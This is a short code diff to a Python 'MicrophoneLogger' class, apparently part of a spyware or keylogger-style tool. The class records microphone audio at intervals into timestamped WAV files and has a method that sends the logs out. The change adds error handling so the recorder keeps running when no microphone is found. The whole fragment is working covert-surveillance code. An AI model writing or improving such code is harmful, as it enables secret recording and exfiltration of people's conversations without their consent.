@@ -21,18 +21,22 @@ class MicrophoneLogger:
         self.running = True
 
     def log_microphone(self):
-        recording = sounddevice.rec(
-            int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
-        )
-        sounddevice.wait()
-        wavfile.write(
-            os.path.join(self.log_directory_path, f"{timestamp()}.wav"),
-            44100,
-            recording,
-        )
-        log_info(
-            f"Logged microphone recording to {os.path.join(self.log_directory_path, f'{timestamp()}.wav')}"
-        )
+        try:
+            recording = sounddevice.rec(
+                int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
+            )
+            sounddevice.wait()
+            wavfile.write(
+                os.path.join(self.log_directory_path, f"{timestamp()}.wav"),
+                44100,
+                recording,
+            )
+            log_info(
+                f"Logged microphone recording to {os.path.join(self.log_directory_path, f'{timestamp()}.wav')}"
+            )
+        except sounddevice.PortAudioError as e:
+            log_info(f"Microphone not available: {e}")
+
 
     def send_logs(self):
         send_log_files_in_directory("`Sending microphone logs...`", self.log_directory)
